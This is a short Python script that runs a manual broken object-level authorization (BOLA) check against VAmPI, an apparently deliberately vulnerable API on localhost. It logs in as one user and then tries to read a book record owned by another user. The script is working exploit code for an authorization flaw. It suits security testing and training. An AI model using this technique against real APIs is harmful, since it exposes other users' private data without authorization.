"""Manual BOLA check against VAmPI.

Logs in as name1, then tries to read a book that belongs to another user.
"""

import requests

BASE_URL = "http://localhost:5000"

# 1. Log in as name1 and get a fresh token
login = requests.post(
    f"{BASE_URL}/users/v1/login",
    json={"username": "name1", "password": "pass1"},
)
token = login.json()["auth_token"]
headers = {"Authorization": f"Bearer {token}"}

# 2. Get the list of all books
books = requests.get(f"{BASE_URL}/books/v1", headers=headers).json()
print("Book list:", books)

# 3. Find a book that does NOT belong to name1
other_book = None
for book in books["Books"]:
    if book["user"] != "name1":
        other_book = book
        break

print("Another user's book:", other_book)

# 4. Try to read that book as name1 (this is the BOLA test)
url = f"{BASE_URL}/books/v1/{other_book['book_title']}"
response = requests.get(url, headers=headers)
print("Status code:", response.status_code)
print("Response:", response.json())